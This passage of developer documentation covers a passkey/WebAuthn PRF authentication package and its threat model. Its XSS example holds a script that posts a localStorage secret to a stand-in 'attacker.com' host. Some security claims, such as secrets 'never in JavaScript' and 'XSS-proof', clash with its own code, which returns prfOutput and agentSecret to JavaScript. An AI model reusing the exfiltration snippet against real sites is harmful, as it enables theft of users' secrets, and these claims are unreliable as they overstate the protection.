│ Purpose: Public cryptographic identity  │
└─────────────────────────────────────────┘
              ↓ accountHeaderForInitialAgentSecret() + idforHeader()
┌─────────────────────────────────────────┐
│ Layer 4: AccountID (DETERMINISTIC!)     │
│ Format: "co_z..."                       │
│ Storage: Public (can be stored)         │
└─────────────────────────────────────────┘
```

**Key Insight:** AccountID is deterministic! Same passkey + salt → same accountID (always!)

### Storage Architecture

```
┌─────────────────────────────────────────┐
│ Passkey (Hardware-Backed)               │
│ Storage: Secure Enclave / TPM            │
│ Content: Private key (never leaves HW)  │
│ Access: Biometric/PIN required           │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ IndexedDB (Local Cache)                  │
│ Storage: Browser IndexedDB               │
│ Content: CoValue data (encrypted)        │
│ Purpose: Fast offline access             │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ Jazz Cloud (Cross-Device Sync)          │
│ Storage: Jazz Cloud server               │
│ Content: CoValue data (end-to-end enc)   │
│ Purpose: Sync across devices             │
└─────────────────────────────────────────┘
```

**Zero Browser Storage:**
- ❌ NO secrets in localStorage
- ❌ NO secrets in sessionStorage
- ❌ NO secrets in IndexedDB (only encrypted CoValue data)
- ✅ Everything derived on-demand from passkey

---

## Documentation Structure

This package documentation is organized into focused topics:

- **[security-analysis.md](./security-analysis.md)** - Overall security analysis and threat model
- **[auth-flows.md](./auth-flows.md)** - Registration and login flows
- **[cryptography.md](./cryptography.md)** - Bottom-up cryptography concepts
- **[api-reference.md](./api-reference.md)** - Complete API reference

---

## Quick Start

### Sign Up (Create New Account)

```javascript
import { signUpWithPasskey } from '@MaiaOS/self';

const { accountID, agentSecret, node, account } = await signUpWithPasskey({
  name: "maia",
  salt: "maia.city"
});

// accountID: "co_z..." (public identifier)
// agentSecret: Ephemeral (never store!)
// node: LocalNode instance (active session)
```

### Sign In (Use Existing Passkey)

```javascript
import { signInWithPasskey } from '@MaiaOS/self';

const { accountID, agentSecret, node, account } = await signInWithPasskey({
  salt: "maia.city"
});

// ⚡ Only 1 biometric prompt!
// Everything computed deterministically from passkey
```

---

## Key Concepts

### Hardware-Backed Secrets

**What it means:**
- PRF evaluation happens in Secure Enclave/TPM (hardware chip)
- Secrets never computed in JavaScript
- Cannot be extracted by XSS attacks or malware

**Why it matters:**
- Even if your browser is compromised, secrets are safe
- Hardware isolation provides stronger security than software-only solutions

### Deterministic Account Recovery

**What it means:**
- Same passkey + same salt → always same accountID
- No random fields in account headers (createdAt: null, uniqueness: null)
- AccountID computed before account creation

**Why it matters:**
- Cross-device recovery without server-side account storage
- No "forgot password" flow needed
- User controls their identity (self-sovereign)

### Zero Browser Storage

**What it means:**
- No secrets stored in localStorage, sessionStorage, or IndexedDB
- All secrets derived on-demand from passkey
- Only public data (accountID) can be stored

**Why it matters:**
- XSS attacks cannot steal secrets (nothing to steal!)
- Device theft mitigated (requires biometric)
- No localStorage compromise risk

---

## Browser Support

### ✅ Supported

- Chrome on macOS, Linux, Windows 11
- Safari on macOS 13+, iOS 16+

### ❌ NOT Supported

- Firefox (all platforms)
- Windows 10 (any browser)
- Old browsers

**The package will throw an error on unsupported browsers with instructions.**

---

## Related Documentation

- [maia-kernel Package](../02_maia-kernel/README.md) - Boot process and orchestration
- [Security Improvements](../architecture/security-improvements.md) - Security analysis
- [Auth Secrets](../architecture/auth-secrets.md) - Secret hierarchy details
- [CoJSON Integration](../architecture/cojson.md) - Database layer

---

## Source Files

**Package:** `libs/maia-self/`

**Key Files:**
- `src/index.js` - Public API exports
- `src/self.js` - Sign up & sign in logic
- `src/prf-evaluator.js` - WebAuthn PRF interface
- `src/feature-detection.js` - PRF support detection
- `src/storage.js` - IndexedDB helper (for CoValue data)
- `src/utils.js` - Encoding/validation utilities

**Dependencies:**
- `cojson` - Core CRDT library
- `cojson-storage-indexeddb` - IndexedDB storage
- `cojson-transport-ws` - WebSocket transport for Jazz Cloud

---

# SECURITY ANALYSIS

*Source: developers/security-analysis.md*

# Security Analysis

Comprehensive security analysis of `@MaiaOS/self` authentication system.

---

## Overview

`@MaiaOS/self` provides hardware-backed, zero-storage authentication that is **more secure** than traditional password-based systems and browser extension password managers.

**Key Security Properties:**
- ✅ **Hardware-backed secrets** - PRF evaluation in Secure Enclave/TPM
- ✅ **Zero browser storage** - No secrets in localStorage/sessionStorage
- ✅ **XSS-proof** - No secrets accessible to JavaScript
- ✅ **Phishing-resistant** - Domain-bound credentials (WebAuthn)
- ✅ **Keylogger-proof** - No keyboard input (biometric only)

---

## Threat Model

### Attack Vectors

#### 1. XSS (Cross-Site Scripting)

**What is it:** Malicious website injects code to steal secrets.

**Traditional Approach:**
- Secrets stored in localStorage
- XSS attack reads localStorage → full account access

**MaiaOS:**
- ✅ **Zero secrets in browser storage**
- ✅ Secrets derived in Secure Enclave (hardware-isolated)
- ✅ XSS cannot access passkey (requires biometric/PIN)

**Result:** ✅ XSS attack fails (nothing to steal)

---

#### 2. Malicious Browser Extension

**What is it:** Fake or compromised extension spies on you.

**Traditional Approach:**
- Extensions can read other extensions' data
- Malicious extension captures master password
- Full account compromise

**MaiaOS:**
- ✅ **No extension required** - Web app only
- ✅ Malicious extensions cannot access Secure Enclave
- ✅ Hardware isolation protects secrets

**Result:** ✅ Extension attacks mitigated (no extension attack surface)

---

#### 3. Phishing

**What is it:** Fake website tricks you into revealing password.

**Traditional Approach:**
- User enters password on fake site
- Attacker captures password → full access

**MaiaOS:**
- ✅ **No password to phish** - Biometric only
- ✅ Passkeys are domain-bound (only work on real site)
- ✅ Fake site cannot trick biometric sensor

**Result:** ✅ Phishing attack fails (no password to steal)

---

#### 4. Keylogger (Spyware)

**What is it:** Malware records every key you press.

**Traditional Approach:**
- Keylogger captures master password
- Attacker has full account access

**MaiaOS:**
- ✅ **No keyboard input** - Biometric only
- ✅ Keylogger cannot capture fingerprint/face
- ✅ PRF evaluation in hardware (keylogger can't see it)

**Result:** ✅ Keylogger attack fails (no keyboard input)

---

#### 5. Memory Dump Attack

**What is it:** Malware reads computer memory to find secrets.

**Traditional Approach:**
- Decrypted passwords sit in RAM
- Memory dump reveals everything

**MaiaOS:**
- ✅ PRF output sits in RAM **temporarily**
- ✅ Secrets cleared immediately after use
- ✅ Secure Enclave protects PRF evaluation
- ✅ Ephemeral secrets (derived on-demand)

**Result:** ✅ Memory dump mitigated (secrets cleared, hardware-protected)

---

#### 6. Device Theft

**What is it:** Someone steals your device and tries to access your account.

**Traditional Approach:**
- Secrets in localStorage → attacker has access
- Needs master password (but might be weak)

**MaiaOS:**
- ✅ Passkey in Secure Enclave (hardware-isolated)
- ✅ Cannot extract without biometric/PIN
- ✅ Hardware rate-limiting prevents brute force

**Result:** ✅ Device theft mitigated (hardware protection)

---

#### 7. Server Breach

**What is it:** Hackers break into the sync server.

**Traditional Approach:**
- Encrypted vaults stored on server
- Weak master passwords can be cracked
- Future quantum computers might break encryption

**MaiaOS:**
- ✅ **Master secret NEVER stored anywhere**
- ✅ Even if Jazz server is hacked, secrets are in hardware
- ✅ Zero-knowledge sync (server cannot decrypt)

**Result:** ✅ Server breach mitigated (master secret never leaves device)

---

## Security Comparison

### MaiaOS vs Browser Extension Password Manager

| Attack Vector | Browser Extension | MaiaOS | Winner |
|---------------|-------------------|--------|--------|
| XSS | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Malicious Extensions | 🔴 High | 🟢 Low | 🏆 MaiaOS |
| Phishing | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Keylogger | 🔴 High | 🟢 Zero | 🏆 MaiaOS |
| Memory Dump | 🔴 High | 🟢 Low | 🏆 MaiaOS |
| Device Theft | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
| Server Breach | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |

**Final Score:** MaiaOS wins **7 out of 7** attack vectors! 🎉

---

## Why MaiaOS is More Secure

### 1. Hardware-Backed Secrets

**Traditional:**
- Secrets generated in JavaScript (software)
- Stored in browser storage (software)
- Accessible to any JavaScript code

**MaiaOS:**
- PRF evaluation in Secure Enclave/TPM (hardware)
- Secrets never leave hardware during derivation
- Accessible only with biometric/PIN

**Security Benefit:**
- ✅ Cannot be extracted by XSS attacks
- ✅ Cannot be logged or sent to error tracking
- ✅ Cannot be stolen from memory dumps

---

### 2. Zero Browser Storage

**Traditional:**
- Must store secrets in localStorage/sessionStorage
- Must store accountID for recovery
- Vulnerable to XSS attacks

**MaiaOS:**
- ✅ Zero secrets in JavaScript (hardware only)
- ✅ Zero accountID in browser storage (computed on-demand)
- ✅ Zero metadata (no "isLoggedIn" flags)
- ✅ XSS cannot access passkey (requires biometric/PIN)

**Security Benefit:**
- ✅ XSS attacks cannot steal secrets
- ✅ Cannot be extracted from browser DevTools
- ✅ Cannot be copied to clipboard
- ✅ Cannot be logged by extensions

---

### 3. Deterministic Account Recovery

**Traditional:**
- Random secret → accountID unknown until account created
- Must store accountID to recover account

**MaiaOS:**
- PRF (deterministic) → accountID **computable before creation!**
- Same passkey + salt → always same accountID

**Security Benefit:**
- ✅ Cross-device recovery without server-side account storage
- ✅ No "forgot password" flow needed
- ✅ No password reset vulnerabilities
- ✅ User controls their identity (self-sovereign)

---

### 4. No Extension Attack Surface

**Traditional:**
- Extension runs in browser
- Malicious extensions can spy
- Extension vulnerabilities

**MaiaOS:**
- ✅ No extension = no extension vulnerabilities
- ✅ Malicious extensions cannot spy on you
- ✅ One less thing to attack

---

## Security Properties

### What We Achieve

#### 1. Hardware-Backed Secrets (Secure Enclave/TPM)

```javascript
// PRF evaluation happens in hardware!
const { prfOutput } = await createPasskeyWithPRF({
  name: "maia",
  userId: randomBytes(32),
  salt: stringToUint8Array("maia.city")
});

// prfOutput NEVER computed in JavaScript
// Evaluation isolated in Secure Enclave/TPM
// Requires biometric/PIN for every access
```

**Security benefit:**
- ✅ Secrets never in JavaScript memory (hardware-isolated)
- ✅ Cannot be extracted by XSS attacks
- ✅ Cannot be logged or sent to error tracking
- ✅ Cannot be stolen from memory dumps

---

#### 2. Zero Browser Storage (XSS-Proof)

```javascript
// NO secrets in localStorage
localStorage.getItem('accountSecret'); // → null

// NO secrets in sessionStorage
sessionStorage.getItem('accountSecret'); // → null

// NO secrets in IndexedDB (only public CoValue data)
// NO secrets in cookies
// NO secrets anywhere in browser!
```

**Security benefit:**
- ✅ XSS attacks cannot steal secrets
- ✅ Cannot be extracted from browser DevTools
- ✅ Cannot be copied to clipboard
- ✅ Cannot be logged by extensions

---

#### 3. Deterministic Account Recovery

```javascript
// Same passkey + same salt → ALWAYS same account
const passkey1 = await signUpWithPasskey({ name: "alice", salt: "maia.city" });
// → accountID: "co_zABC..."

// Later, on different device with same passkey:
const passkey2 = await signInWithPasskey({ salt: "maia.city" });
// → accountID: "co_zABC..." (SAME!)

// This is deterministic because:
// 1. PRF(passkey, salt) → always same prfOutput
// 2. prfOutput → always same agentSecret
// 3. agentSecret → always same accountID (no random fields!)
```

**Security benefit:**
- ✅ Cross-device recovery without server-side account storage
- ✅ No "forgot password" flow needed
- ✅ No password reset vulnerabilities
- ✅ User controls their identity (self-sovereign)

---

#### 4. End-to-End Encryption (Jazz Cloud Cannot Read)

```javascript
// All CoValue data is encrypted with keys only you control
const node = await LocalNode.withNewlyCreatedAccount({
  crypto,
  initialAgentSecret: agentSecret, // Only you have this!
  peers: [jazzSyncPeer],           // Jazz Cloud sync
  storage: indexedDBStorage
});

// Jazz Cloud stores encrypted transactions
// Server cannot decrypt content
// Only devices with your agentSecret can read data
```

**Security benefit:**
- ✅ Zero-knowledge sync (server cannot read your data)
- ✅ No "data breach" risk (server has encrypted blobs only)
- ✅ No trust required in sync provider
- ✅ You control encryption keys (not the server)

---

## Attack Surface Analysis

### XSS Attack (Cross-Site Scripting)

**Traditional Approach:**
```javascript
// Attacker injects:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accountSecret') // ❌ Full access!
  });
</script>
```

**MaiaOS:**
```javascript
// Attacker tries:
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accountSecret') // → null (not stored!)
  });
</script>

// To access passkey, attacker would need:
// 1. User's biometric (impossible to steal via XSS)
// 2. User's PIN (impossible to steal via XSS)
// 3. Physical access to device (not via XSS)
```

**Result:** ✅ XSS attack fails (no secrets to steal)

---

### Device Theft

**Traditional Approach:**
- Attacker steals device
- Extracts localStorage secrets
- Full account access (no biometric required)

**MaiaOS:**
- Attacker steals device
- Passkey in Secure Enclave (hardware-isolated)
- Cannot extract without biometric/PIN
- Cannot brute-force (hardware rate-limiting)

**Result:** ✅ Device theft mitigated (hardware protection)

---

### Phishing Attack

**Traditional Approach:**
- Attacker creates fake login page
- User enters password
- Attacker captures password → Full access

**MaiaOS:**
- Attacker creates fake login page
- User clicks "Sign in with passkey"
- WebAuthn verifies domain → Passkey only works on real domain
- Attacker cannot capture passkey

**Result:** ✅ Phishing attack fails (domain-bound credentials)

---

## Implementation Requirements

### DO ✅

1. **Always use PRF** (strict mode, no fallbacks)
2. **Never log secrets** to console or error tracking
3. **Use HTTPS only** (passkeys require secure context)
4. **Validate accountID computation** (verify match after creation)
5. **Trust hardware** (let Secure Enclave/TPM do its job)
6. **Default salt: "maia.city"** (consistent for deterministic recovery)

### DON'T ❌

1. **Never store secrets in browser storage** (localStorage, sessionStorage, IndexedDB)
2. **Never store accountID in browser storage** (compute on-demand)
3. **Never create backwards-compatible fallbacks** (PRF or nothing!)
4. **Never bypass biometric/PIN** (hardware protection is our security model)
5. **Never log prfOutput** (treat as master password)
6. **Never send secrets to server** (even encrypted - unnecessary!)

---

## Related Documentation

- [Main README](./README.md) - Package overview
- [auth-flows.md](./auth-flows.md) - Registration and login flows
- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
- [api-reference.md](./api-reference.md) - API reference
- [Security Improvements](../architecture/security-improvements.md) - Detailed security analysis

---

